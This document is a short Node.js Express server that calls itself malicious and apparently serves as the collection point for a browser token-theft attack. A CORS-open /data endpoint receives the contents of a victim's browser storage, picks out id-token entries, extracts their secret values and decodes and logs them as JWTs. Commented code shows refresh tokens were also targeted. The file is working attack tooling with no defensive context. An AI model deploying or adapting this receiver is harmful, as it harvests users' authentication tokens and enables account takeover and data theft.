const express = require("express");
const cors = require('cors');
const axios = require('axios');
const app = express();
const port = 3000;
const TIMEOUT = 10 * 1000;
const path = require('path');
const { jwtDecode } = require('jwt-decode');

let latest_token = null;
let last_seen = null;
let client_status = "unknown";


// Enable CORS
app.use(cors());

// Accept incoming JSON data
app.use(express.json());

// Serve JS files from the js folder
app.use("/js", express.static("js"));

app.get('/', function (req, res) {
    res.sendFile(path.join(__dirname, '/index.html'));
});

// Accept incoming data
app.post("/data", (req, res) => {
    last_seen = Date.now();
    client_status = "live";

    let storageContentFromPayload = req.body;
    let itemFromPayload = null;
    let tokenFromPayload = null;

    for (const [key, value] of Object.entries(storageContentFromPayload)) {
        // if (key.includes('refresh')) {
        if (key.includes('idtoken')) {
            // print key and value
            // console.log({ key, value });

            // parse and print element
            itemFromPayload = JSON.parse(value)
            // console.log("== refresh Item from browser storage ==");
            // console.log(item);

            // parse item secret field to obtain the refresh token
            tokenFromPayload = itemFromPayload.secret;
            // console.log("== RAW token ==");
            // console.log(tokenFromPayload);
        }
    };

    let token = tokenFromPayload; //req.body["refresh_token"];
    // console.log("=== token ===", token)

    if (token != latest_token) {
        latest_token = token;
        let decoded = jwtDecode(token);
        console.log("=== DECODED ===\n", decoded);

        // console.log(`Latest Token ===\n${latest_token}`);
    }
    else {
        //console.log(`Token received, but already known`);
    }
    res.status(200).send();
});

setInterval(async () => {
    if (latest_token != null) {
        await assessToken();
    }
}, 3 * 1000);

app.listen(port, () => {
    console.log(`\n\nMalicious http://localhost:${port}. Ready to attack... ;-)`)
})

async function assessToken() {
    // console.log(`==> Client Application is still alive`)
}